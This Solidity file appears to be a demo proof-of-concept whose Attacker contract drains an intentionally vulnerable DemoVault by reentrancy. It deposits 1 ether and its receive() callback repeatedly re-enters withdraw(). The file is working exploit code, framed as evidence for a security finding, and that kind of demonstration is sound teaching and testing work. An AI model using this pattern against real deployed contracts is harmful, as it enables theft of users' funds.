// SPDX-License-Identifier: MIT
// ============================================================================
// DEMO PROOF-OF-CONCEPT — part of the intentional demo only. This contract
// attacks DemoVault.sol (the intentionally vulnerable demo target) and
// nothing else. It is the executable evidence for the demo finding.
// ============================================================================

pragma solidity ^0.8.0;

interface IDemoVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title Attacker — reentrancy PoC against DemoVault
/// @notice Deposits 1 ether, then withdraws it. Each time the vault sends
/// ETH, the receive() callback re-enters withdraw() before the vault has
/// zeroed the attacker's balance, draining the vault 1 ether at a time.
contract Attacker {
    IDemoVault public immutable vault;
    uint256 public constant ATTACK_AMOUNT = 1 ether;
    uint256 public reentries;

    constructor(address vault_) {
        vault = IDemoVault(vault_);
    }

    /// @notice Run the attack. Caller must have funded this contract with
    /// at least ATTACK_AMOUNT first.
    function attack() external {
        vault.deposit{value: ATTACK_AMOUNT}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= ATTACK_AMOUNT) {
            reentries += 1;
            vault.withdraw();
        }
    }
}
